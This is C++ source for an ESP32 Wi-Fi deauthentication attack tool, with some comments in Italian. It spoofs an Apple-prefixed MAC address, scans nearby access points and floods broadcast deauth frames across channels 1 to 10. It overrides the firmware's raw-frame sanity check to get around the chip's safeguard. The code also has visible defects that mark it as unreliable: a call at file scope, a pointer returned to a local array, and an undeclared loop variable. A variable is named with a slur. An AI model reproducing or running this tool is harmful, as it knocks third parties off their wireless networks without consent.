extern "C" {
#include "freertos/FreeRTOS.h"

#include "esp_system.h"
#include "esp_event.h"
#include "esp_wifi.h"

#include "nvs_flash.h"
#include <time.h>

#include "configure_wifi.h"
}

#include "packet.hpp"

PacketSender sender;
srand(time(NULL));
//esp_err_t esp_wifi_set_mac(wifi_interface_t ifx, const uint8_t mac[6])
void spoof_MAC(__uint8_t * pMAC ){
    //apple 98:ca:33
    unsigned char gay[3];
    for(int i = 0; i <3 ;i++){
        gay[i]= (unsigned char) rand() % 256; 
    }
    unsigned char tmp[6] = {0x98, 0xca, 0x33, gay[0], gay[1], gay[2] };

    for(int i =0 ; i<6 ;i++){

    pMAC[i] = tmp[i];
    
    }
        

}

//esp_err_t esp_wifi_scan_start(const wifi_scan_config_t *config, bool block)
//esp_err_t esp_wifi_scan_stop(void)
//esp_err_t esp_wifi_scan_get_ap_records(uint16_t *number, wifi_ap_record_t *ap_records)
wifi_ap_record_t *scanWifi(){
    
    esp_wifi_scan_start(NULL,true);
    esp_wifi_scan_stop();
    uint16_t maxAP = 32; //arbitrary number max APs stored
    wifi_ap_record_t apRecords[maxAP];
    esp_wifi_scan_get_ap_records(&maxAP , apRecords);
    return apRecords ;

}

void spam_task(void *pvParameter) {
    const MacAddr TARGET = { //target broadcast
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF
    };
    MacAddr AP = {
        //re place with your AP's mac address
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    spoof_MAC(&AP);
    wifi_ap_record_t APsFound = scanWifi();
    
	while(1) {
        vTaskDelay(1000 / portTICK_PERIOD_MS);
    //for(i : APsfound){
        for(uint8_t ch = 1; ch < 11; ch++) {
            printf("Deauthing channel %d\n", ch);
            esp_err_t res;
            res = sender.deauth(TARGET, i.mac, i.mac, 1, ch);
            if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
        }
    //}
/*
        for(uint8_t ch = 1; ch < 11; ch++) {
            printf("Deauthing channel %d\n", ch);
            esp_err_t res;
            res = sender.deauth(TARGET, AP, AP, 1, ch);
            if(res != ESP_OK) printf("  Error: %s\n", esp_err_to_name(res));
        }
*/
        
    }
}




extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0; //LA FUNZIONE IMPEDISCE DI MANDARE PACCHETTI "STRANI"
}

extern "C" void app_main(void) {
    nvs_flash_init();
    tcpip_adapter_init();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    // Init dummy AP to specify a channel and get WiFi hardware into
    // a mode where we can send the actual fake beacon frames.
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));

    ESP_ERROR_CHECK(esp32_deauther_configure_wifi(/* channel */ 1));

    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    xTaskCreate(&spam_task, "spam_task", 2048 /*profondità dellostack*/, NULL, 5, NULL);
}

